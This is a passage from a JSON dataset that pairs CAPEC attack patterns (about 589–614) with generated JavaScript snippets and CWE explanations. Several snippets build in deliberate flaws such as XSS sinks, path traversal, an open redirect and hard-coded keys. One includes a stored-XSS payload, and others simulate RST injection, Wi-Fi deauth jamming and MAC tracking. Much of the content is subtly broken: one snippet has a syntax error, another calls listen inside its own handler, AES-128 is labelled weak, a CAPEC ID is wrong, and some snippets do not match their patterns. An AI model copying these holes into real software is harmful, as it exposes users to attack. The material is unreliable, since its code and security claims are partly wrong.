        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const requestedHost = req.headers.host;\n\n  // Vulnerable: Binding to an unrestricted IP address\n  server.listen(80, '0.0.0.0');\n\n  // Vulnerable: Reliance on IP address for authentication\n  if (clientIP === '192.168.1.100') {\n    // Vulnerable: DNS Blocking by intercepting and dropping DNS requests\n    dns.resolve(requestedHost, (err, addresses) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('DNS resolution failed. Access denied.');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end('Access granted to ' + requestedHost);\n      }\n    });\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied.');\n  }\n});\n\nserver.listen(8080);",
        "description": "This JavaScript code snippet demonstrates a simple HTTP server that embodies the concept of DNS Blocking. The server listens on an unrestricted IP address (0.0.0.0), which is a vulnerability (CWE-1327). It uses the client's IP address for authentication (CWE-291), which is another vulnerability. When a request is made, the server attempts to resolve the requested host's DNS. If the DNS resolution fails, it denies access, simulating DNS Blocking by intercepting and dropping DNS requests based on their content. This represents an adversary's ability to deny the availability of specific services or content to the user by manipulating DNS requests."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  const clientIP = req.connection.remoteAddress;\n  const blockedIP = '192.168.1.100';\n\n  if (clientIP === blockedIP) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome');\n  }\n});\n\nserver.listen(8080, '0.0.0.0', () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that listens on all network interfaces (0.0.0.0) on port 8080. The server checks the IP address of incoming requests and blocks access if the IP address matches a predefined blocked IP (192.168.1.100). This embodies the main idea of the CAPEC 'IP Address Blocking' by demonstrating how an adversary might block packets destined for a target IP address. The code also highlights related CWEs: CWE-1327 (Binding to an Unrestricted IP Address) by binding to 0.0.0.0, CWE-291 (Reliance on IP Address for Authentication) by using the IP address to determine access, and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not ensuring the correct endpoint communication."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Reflected XSS Example</title>\n</head>\n<body>\n    <h1>Search Results</h1>\n    <div id=\"results\"></div>\n    <script>\n        // Simulate user input from URL parameter\n        var userInput = new URLSearchParams(window.location.search).get('query');\n        // Vulnerable code: directly inserting user input into the DOM without proper sanitization\n        document.getElementById('results').innerHTML = 'You searched for: ' + userInput;\n    </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a Reflected XSS vulnerability. The code takes user input from a URL parameter ('query') and directly inserts it into the DOM without proper sanitization. This allows an attacker to craft a malicious URL containing a script, which will be executed in the victim's browser when they visit the URL. This example embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) by showing how unsanitized user input can lead to script execution in the context of a web page."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Stored XSS Example</title>\n</head>\n<body>\n    <h1>Comment Section</h1>\n    <form method=\"POST\" action=\"/submit_comment\">\n        <textarea name=\"comment\"></textarea>\n        <button type=\"submit\">Submit</button>\n    </form>\n    <div id=\"comments\">\n        <!-- Assume comments are fetched from a database and inserted here -->\n        <div class=\"comment\">User1: <img src=\"x\" onerror=\"alert('XSS')\"></div>\n    </div>\n</body>\n</html>",
        "description": "This HTML code snippet represents a simple web page with a comment section where users can submit comments. The comments are stored in a database and later displayed on the page. The vulnerability lies in the fact that user input is not properly sanitized before being stored and displayed. In this example, a malicious user has submitted a comment containing an IMG tag with an 'onerror' attribute that executes JavaScript code, leading to a Stored XSS attack. This demonstrates CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags), and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { maxAge: 60000 }\n}));\n\napp.post('/login', (req, res) => {\n  // Assume user authentication is done here\n  req.session.user = { id: 'user123' };\n  res.send('Logged in');\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.user) {\n    res.send('Welcome to your dashboard');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web application with session management. The code demonstrates a potential vulnerability related to session hijacking. The session is created with a fixed secret key and does not invalidate old session IDs upon login (CWE-384). Additionally, the session expiration is set to a short duration, but it may still be insufficient (CWE-613). The code also does not sufficiently prove the user's identity during authentication (CWE-287). This setup can allow an attacker to hijack or manipulate active sessions, gaining unauthorized access to the application, which embodies the main idea of the CAPEC for session hijacking."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received:', data.toString());\n    \n    // CWE-924: No integrity check\n    if (data.toString().includes('INJECT')) {\n      // CWE-99: Improper Control of Resource Identifiers\n      const resource = data.toString().split(' ')[1];\n      console.log('Accessing resource:', resource);\n    }\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-940: No verification of source\nconst client = net.createConnection({ port: 8080 }, () => {\n  client.write('INJECT /sensitiveResource');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming data and logs it in cleartext (CWE-319). It does not verify the integrity of the message (CWE-924) or the source of the communication (CWE-940). If the data contains the keyword 'INJECT', it improperly handles the resource identifier (CWE-99) by directly accessing the specified resource. This setup allows an adversary to inject traffic into the network connection, potentially modifying the content and accessing sensitive resources, embodying the main idea of the CAPEC 'Traffic Injection'."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nconst targetHost = 'target.server.com';\nconst targetPort = 80;\n\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target server');\n  // Simulate sending a legitimate request\n  client.write('GET / HTTP/1.1\\r\\nHost: ' + targetHost + '\\r\\n\\r\\n');\n});\n\nclient.on('data', (data) => {\n  console.log('Received data from server:', data.toString());\n  // Inject a connection reset packet\n  client.destroy();\n  console.log('Connection reset packet sent');\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a connection reset attack using Node.js's 'net' module. The code connects to a target server, sends a legitimate HTTP request, and then immediately closes the connection, simulating the injection of a connection reset packet. This disrupts the communication channel between the client and the server. The code embodies the main idea of CAPEC-Connection Reset by showing how an attacker can sever a connection without directly filtering the traffic. The related CWEs are represented in the context of improper verification of the communication channel's source, lack of message integrity enforcement, and potential for multiple binds to the same port."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "const net = require('net');\n\nconst targetHost = 'example.com';\nconst targetPort = 80;\nconst fakeRSTPacket = Buffer.from('45000028a6f400004006b1e6c0a80001c0a80002', 'hex');\n\nconst client = new net.Socket();\nclient.connect(targetPort, targetHost, () => {\n  console.log('Connected to target');\n  client.write(fakeRSTPacket);\n  console.log('Sent fake RST packet');\n  client.destroy();\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP RST Injection attack. It uses the 'net' module to create a TCP connection to a target server (example.com on port 80). Once connected, it sends a fake TCP RST packet to the server, which can cause the server to terminate the TCP connection. This attack leverages CWE-940 (Improper Verification of Source of a Communication Channel) as the server does not verify the source of the RST packet. The code also highlights the potential for other related weaknesses, such as CWE-918 (Server-Side Request Forgery) and CWE-294 (Authentication Bypass by Capture-replay), by showing how an attacker can manipulate network traffic to disrupt communication."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const filePath = path.join(__dirname, req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.write(data);\n      res.end();\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads and serves files based on the URL requested by the client. The main vulnerability here is the use of `path.join(__dirname, req.url)` without proper validation or sanitization of the `req.url` input. This allows an attacker to perform an absolute path traversal attack by manipulating the URL to include sequences like `../` or absolute paths, potentially accessing sensitive files outside the intended directory. This code embodies the main idea of CAPEC-36 (Absolute Path Traversal) and related CWEs, demonstrating how improper handling of file paths can lead to security vulnerabilities."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nfunction fetchData(url) {\n  dns.resolve4(url, (err, addresses) => {\n    if (err) throw err;\n    const ip = addresses[0];\n    dns.reverse(ip, (err, hostnames) => {\n      if (err) throw err;\n      const hostname = hostnames[0];\n      if (hostname !== url) {\n        console.error('DNS Spoofing detected!');\n        return;\n      }\n      http.get(`http://${ip}`, (res) => {\n        let data = '';\n        res.on('data', (chunk) => { data += chunk; });\n        res.on('end', () => { console.log(data); });\n      }).on('error', (e) => { console.error(`Got error: ${e.message}`); });\n    });\n  });\n}\n\nfetchData('example.com');",
        "description": "This JavaScript code snippet demonstrates a scenario where DNS spoofing can occur. The `fetchData` function takes a URL, resolves its IP address, and then performs a reverse DNS lookup to verify the hostname. If the hostname does not match the original URL, it logs an error indicating potential DNS spoofing. The code then attempts to fetch data from the resolved IP address. This snippet embodies the main idea of DNS Spoofing (CAPEC-139) and highlights related weaknesses such as reliance on reverse DNS resolution (CWE-350) and incorrectly specified destinations (CWE-941)."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Simulate sending sensitive data over an insecure channel\nfunction sendData(data) {\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  console.log('Sending data:', data);\n}\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\nfunction establishConnection(endpoint) {\n  if (endpoint !== 'trusted_endpoint') {\n    console.warn('Warning: Untrusted endpoint!');\n  }\n  return true;\n}\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission\nfunction receiveData() {\n  let receivedData = 'tampered_data'; // Simulate data tampering\n  if (receivedData !== sensitiveData) {\n    console.error('Error: Data integrity check failed!');\n  }\n  return receivedData;\n}\n\n// Simulate the attack scenario\nif (establishConnection('untrusted_endpoint')) {\n  sendData(sensitiveData);\n  receiveData();\n}",
        "description": "This JavaScript code snippet simulates a scenario where sensitive data is transmitted over an insecure channel, embodying the main idea of the CAPEC 'Terrestrial Jamming'. The code demonstrates several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) by logging sensitive data to the console, CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by warning if the endpoint is untrusted, and CWE-924 (Improper Enforcement of Message Integrity During Transmission) by simulating data tampering and failing an integrity check. This represents how an attacker could exploit these weaknesses to disrupt communication and compromise data integrity."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nconst users = { 'user1': 'password123', 'user2': 'password456' }; // CWE-522: Insufficiently Protected Credentials\nlet loginAttempts = {}; // CWE-307: Improper Restriction of Excessive Authentication Attempts\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const currentTime = Date.now();\n\n  if (!loginAttempts[username]) {\n    loginAttempts[username] = [];\n  }\n\n  // Remove attempts older than 1 minute\n  loginAttempts[username] = loginAttempts[username].filter(attempt => currentTime - attempt < 60000);\n\n  if (loginAttempts[username].length >= 5) {\n    return res.status(429).send('Too many login attempts. Please try again later.');\n  }\n\n  if (users[username] && users[username] === password) { // CWE-308: Use of Single-factor Authentication\n    loginAttempts[username] = []; // Reset attempts on successful login\n    return res.status(200).send('Login successful');\n  } else {\n    loginAttempts[username].push(currentTime);\n    return res.status(401).send('Invalid username or password');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. It embodies the main idea of CAPEC- Credential Stuffing by demonstrating how an adversary might exploit weak authentication mechanisms. The code includes several related CWEs:\n\n1. CWE-522: Insufficiently Protected Credentials - The credentials are stored in plain text within the code.\n2. CWE-307: Improper Restriction of Excessive Authentication Attempts - The code implements a basic mechanism to limit login attempts to 5 per minute.\n3. CWE-308: Use of Single-factor Authentication - The authentication mechanism relies solely on username and password.\n\nThe code allows users to attempt login with a username and password. If the credentials match, the user is logged in. If not, the attempt is recorded, and after 5 failed attempts within a minute, further attempts are temporarily blocked. This demonstrates the vulnerability to credential stuffing attacks due to the use of single-factor authentication and insufficiently protected credentials."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    console.log('Received:', data.toString());\n    \n    // CWE-924: No integrity check\n    if (data.toString().includes('important')) {\n      // CWE-923: No endpoint verification\n      socket.write('Important data received');\n    }\n  });\n\n  // CWE-406: No control of message volume\n  for (let i = 0; i < 1000; i++) {\n    socket.write('Flooding the channel');\n  }\n\n  // CWE-421: Race condition on alternate channel\n  setTimeout(() => {\n    socket.write('Alternate channel message');\n  }, 100);\n});\n\nserver.listen(8080, '127.0.0.1');",
        "description": "This JavaScript code snippet creates a TCP server using the 'net' module. The server listens for incoming connections and processes data from clients. The code demonstrates several vulnerabilities: \n1. CWE-319: Sensitive information is logged in cleartext.\n2. CWE-924: There is no integrity check on the received data.\n3. CWE-923: The server does not verify the endpoint before sending a response.\n4. CWE-406: The server floods the communication channel with excessive messages.\n5. CWE-421: A race condition is introduced by sending a message on an alternate channel after a delay. \nThese vulnerabilities collectively illustrate the concept of 'Jamming,' where an adversary can disrupt communications by exploiting these weaknesses."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "const crypto = require('crypto');\n\n// Using an obsolete function for encryption\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('aes-256-cbc', 'deprecated-key');\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Example usage\nconst sensitiveData = 'Sensitive Information';\nconst encryptedData = encryptData(sensitiveData);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates the use of an obsolete function for encryption, which is a common issue related to CWE-477 (Use of Obsolete Function). The `crypto.createCipher` function is deprecated and should be replaced with `crypto.createCipheriv` for better security practices. This code snippet highlights the main idea of the CAPEC, which is the degradation of security due to the use of outdated and deprecated methods. By using such obsolete functions, the code becomes vulnerable to various attacks, as it indicates a lack of active review and maintenance."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // Simulate resource allocation without limits\n  let data = [];\n  for (let i = 0; i < 1e6; i++) {\n    data.push(new Array(1e6).join('x'));\n  }\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Resource allocated');\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that allocates a large amount of memory for each request without any limits or throttling. This can lead to uncontrolled resource consumption (CWE-400) and potentially exhaust the system's memory, causing it to fail or stop working. The code demonstrates the concept of 'Blockage' (CAPEC) by showing how an adversary could exploit the lack of resource allocation limits to disrupt the system's functionality."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "const wifiChannel = 'channel-6';\nconst deauthFrame = 'deauth';\n\nfunction sendDeauthFrame(channel, frame) {\n  // Simulate sending a deauthentication frame to the Wi-Fi channel\n  console.log(`Sending ${frame} frame on ${channel}`);\n}\n\nfunction jamWiFi() {\n  // Continuously send deauthentication frames to jam the Wi-Fi channel\n  setInterval(() => {\n    sendDeauthFrame(wifiChannel, deauthFrame);\n  }, 1000); // Send a frame every second\n}\n\njamWiFi();",
        "description": "This JavaScript code snippet simulates a Wi-Fi jamming attack by continuously sending deauthentication frames to a specified Wi-Fi channel. The `sendDeauthFrame` function logs the action of sending a deauthentication frame to the console. The `jamWiFi` function uses `setInterval` to repeatedly call `sendDeauthFrame` every second, effectively jamming the Wi-Fi channel. This represents the CAPEC scenario of Wi-Fi jamming by flooding the access point with deauthentication frames. The code also touches on related CWEs by demonstrating improper enforcement of message integrity (CWE-924), improper restriction of communication channels (CWE-923), and improper verification of the source of communication (CWE-940)."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(12345, '192.168.1.1', () => {\n  console.log('Connected to cell tower');\n  // CWE-319: Transmitting sensitive information in cleartext\n  client.write('AUTH: user:password');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-924: Not verifying message integrity\n  if (data.includes('STATUS')) {\n    // CWE-300: Channel accessible by non-endpoint\n    client.write('STATUS: OK');\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-940: Not verifying the source of the communication\nclient.on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP client that connects to a cell tower (simulated by an IP address and port). The client sends an authentication message in cleartext (CWE-319), which can be intercepted by unauthorized actors. Upon receiving data, it does not verify the integrity of the message (CWE-924) and responds to status messages without ensuring the channel is secure (CWE-300). Additionally, the client does not verify the source of incoming messages (CWE-940), making it susceptible to attacks where an attacker can impersonate the cell tower or inject malicious data. This code embodies the main idea of the Cellular Jamming CAPEC by illustrating how improper handling of communication channels can lead to vulnerabilities that disrupt cellular communication."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate negotiation of encryption algorithm\nfunction negotiateEncryption(availableAlgorithms) {\n  // Vulnerable: Selects the first available algorithm, which might be weak\n  return availableAlgorithms[0];\n}\n\n// Simulate a communication channel\nfunction communicate(data, algorithm) {\n  let key;\n  if (algorithm === 'A5/0') {\n    // No encryption\n    return data;\n  } else if (algorithm === 'A5/1' || algorithm === 'A5/2') {\n    // Weak encryption (simulated with a hard-coded key)\n    key = '1234567890abcdef'; // CWE-321: Hard-coded cryptographic key\n  } else {\n    // Stronger encryption (for demonstration purposes)\n    key = crypto.randomBytes(16).toString('hex');\n  }\n\n  const cipher = crypto.createCipheriv('aes-128-ecb', key, null);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Example usage\nconst availableAlgorithms = ['A5/0', 'A5/1', 'A5/2', 'AES-128'];\nconst selectedAlgorithm = negotiateEncryption(availableAlgorithms);\nconst message = 'Sensitive Data';\nconst encryptedMessage = communicate(message, selectedAlgorithm);\nconsole.log(`Selected Algorithm: ${selectedAlgorithm}`);\nconsole.log(`Encrypted Message: ${encryptedMessage}`);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of encryption algorithm negotiation and communication. The `negotiateEncryption` function simulates the selection of an encryption algorithm from a list of available algorithms, but it naively selects the first one, which could be a weak or no encryption algorithm (CWE-757). The `communicate` function simulates the transmission of data using the selected algorithm. If the algorithm is 'A5/0', no encryption is applied (CAPEC-Weakening of Cellular Encryption). If 'A5/1' or 'A5/2' is selected, weak encryption is applied using a hard-coded key (CWE-321). The code highlights the risks of using weak or no encryption and the importance of proper algorithm selection and key management."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "const fs = require('fs');\n\n// CWE-693: Protection Mechanism Failure\nfunction readConfig(filePath) {\n  try {\n    return fs.readFileSync(filePath, 'utf8');\n  } catch (err) {\n    console.error('Error reading config:', err);\n    return null;\n  }\n}\n\n// CWE-653: Improper Isolation or Compartmentalization\nfunction processRequest(userInput) {\n  const config = readConfig('/etc/config');\n  if (config) {\n    // CWE-1334: Unauthorized Error Injection\n    if (userInput === 'injectError') {\n      throw new Error('Injected error to degrade system');\n    }\n    console.log('Processing request with config:', config);\n  } else {\n    console.error('Failed to process request due to missing config');\n  }\n}\n\n// Simulate an obstruction attack\ntry {\n  processRequest('injectError');\n} catch (err) {\n  console.error('System degraded due to error:', err);\n}",
        "description": "This JavaScript code snippet demonstrates an obstruction attack by simulating the interruption of system component interactions. The `readConfig` function (CWE-693) attempts to read a configuration file, and if it fails, it returns null, representing a protection mechanism failure. The `processRequest` function (CWE-653) processes user input without proper isolation, allowing an attacker to inject an error (CWE-1334) that degrades the system. The code simulates an obstruction attack by calling `processRequest` with an input that triggers an error, demonstrating how an attacker can force the system into a degraded state."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\n// Use of a broken or risky cryptographic algorithm (CWE-327)\nconst algorithm = 'aes-128-cbc'; // Weak encryption algorithm\nconst key = '1234567890123456'; // Hard-coded cryptographic key (CWE-321)\nconst iv = crypto.randomBytes(16);\n\nfunction encrypt(text) {\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction decrypt(encrypted) {\n  const decipher = crypto.createDecipheriv(algorithm, key, iv);\n  let decrypted = decipher.update(encrypted, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n}\n\n// Example usage\nconst message = 'Sensitive data';\nconst encryptedMessage = encrypt(message);\nconsole.log('Encrypted:', encryptedMessage);\nconst decryptedMessage = decrypt(encryptedMessage);\nconsole.log('Decrypted:', decryptedMessage);",
        "description": "This JavaScript code snippet demonstrates the use of a broken or risky cryptographic algorithm (CWE-327) by employing 'aes-128-cbc', which is considered weak by modern standards. It also uses a hard-coded cryptographic key (CWE-321), which is a significant security risk. The code provides functions to encrypt and decrypt a message using this weak encryption scheme. This embodies the main idea of the CAPEC 'Cryptanalysis of Cellular Encryption', highlighting how weak encryption algorithms and poor key management can lead to vulnerabilities that attackers can exploit to decrypt sensitive information."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: No verification of the source of the communication channel\n  if (req.url === '/sensitive-data') {\n    // CWE-319: Transmitting sensitive data in cleartext\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Sensitive Information: User Passwords\n');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. When a request is made to the '/sensitive-data' endpoint, the server responds with sensitive information (user passwords) in cleartext. This embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by demonstrating how sensitive data can be intercepted if transmitted without encryption. The code also highlights several related CWEs: CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the request, and CWE-319 (Cleartext Transmission of Sensitive Information) by sending sensitive data in cleartext."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  console.log('Connected');\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  client.write('SensitiveData:12345');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  if (data.includes('SensitiveData')) {\n    console.log('Data integrity check failed');\n  }\n  client.destroy();\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-319: Cleartext Transmission of Sensitive Information\n// CWE-406: Insufficient Control of Network Message Volume\nfor (let i = 0; i < 1000; i++) {\n  client.write('Ping');\n}",
        "description": "This JavaScript code snippet demonstrates a simple TCP client that connects to a server and transmits sensitive information in cleartext. The code embodies the main idea of the CAPEC 'Cellular Data Injection' by showing how an adversary could inject data into a communication channel. The code includes CWE-201 by inserting sensitive information into the sent data, CWE-924 by not ensuring message integrity, CWE-319 by transmitting data in cleartext, and CWE-406 by sending a large volume of messages to potentially disrupt the network. This snippet highlights the vulnerabilities that could be exploited for data injection and surveillance operations."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    // CWE-601: URL Redirection to Untrusted Site\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.write('<html><body><h1>Welcome to Trusted Site</h1></body></html>');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server checks for a 'redirect' query parameter in the URL. If the parameter is present, it redirects the user to the specified URL (CWE-601: URL Redirection to Untrusted Site). This demonstrates the concept of BitSquatting, where an attacker could register a domain name similar to a trusted one and redirect traffic to a malicious site. The code also highlights the risk of open redirects, which can be exploited in phishing attacks. The server listens on port 8080 and responds with a welcome message if no redirect parameter is provided."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "const wifi = require('node-wifi');\nconst fs = require('fs');\n\nwifi.init({ iface: null });\n\nfunction logMacAddresses() {\n  wifi.scan((err, networks) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    const macAddresses = networks.map(network => network.mac);\n    fs.writeFile('mac_addresses.txt', macAddresses.join('\\n'), (err) => {\n      if (err) {\n        console.error('Error writing MAC addresses to file:', err);\n      } else {\n        console.log('MAC addresses logged successfully.');\n      }\n    });\n  });\n}\n\nlogMacAddresses();",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for nearby WiFi networks and logs their MAC addresses to a file named 'mac_addresses.txt'. The code initializes the WiFi module, scans for networks, extracts the MAC addresses, and writes them to a file. This embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by demonstrating how an attacker could passively collect MAC addresses. The code also touches on related CWEs: it transmits sensitive information (MAC addresses) to a file (CWE-201), and the file could be accessed by unauthorized actors if not properly secured (CWE-529)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "const wifi = require('node-wifi');\n\nwifi.init({ iface: null });\n\nfunction trackSSID() {\n  wifi.scan((error, networks) => {\n    if (error) {\n      console.error(error);\n      return;\n    }\n    networks.forEach(network => {\n      if (network.ssid) {\n        console.log(`Detected SSID: ${network.ssid}`);\n        // Potentially store or track the SSID\n      }\n    });\n  });\n}\n\nsetInterval(trackSSID, 5000);",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for available WiFi networks and log their SSIDs. The 'trackSSID' function scans for networks every 5 seconds and prints the detected SSIDs to the console. This embodies the main idea of the CAPEC 'WiFi SSID Tracking' by passively listening for WiFi management frames containing SSIDs. The code demonstrates CWE-201 by potentially exposing sensitive SSID information, CWE-300 by not verifying the identity of the WiFi networks, and CWE-1290 by not ensuring the integrity of the SSID data. The code is a simplified representation of how an attacker might track users based on their WiFi SSIDs."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate a weak DES key\nconst desKey = '12345678'; // CWE-326: Inadequate Encryption Strength\n\n// Function to simulate sending an OTA update via SMS\nfunction sendOTAUpdate(phoneNumber, message) {\n  const cipher = crypto.createCipheriv('des-ecb', desKey, null); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  let encryptedMessage = cipher.update(message, 'utf8', 'hex');\n  encryptedMessage += cipher.final('hex');\n  console.log(`Sending OTA update to ${phoneNumber}: ${encryptedMessage}`);\n}\n\n// Example usage\nconst phoneNumber = '+1234567890';\nconst maliciousApplet = 'malicious code';\nsendOTAUpdate(phoneNumber, maliciousApplet);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. It uses a weak DES key (CWE-326) to encrypt a message, simulating the use of a broken or risky cryptographic algorithm (CWE-327). The `sendOTAUpdate` function encrypts a message (which could be a malicious applet) and logs the encrypted message, representing the process of sending an OTA update via SMS. This code highlights the vulnerabilities associated with using inadequate encryption strength and broken cryptographic algorithms, which can be exploited to deliver and execute malicious code on a SIM card."
    },
    {
        "capec_id": "615",
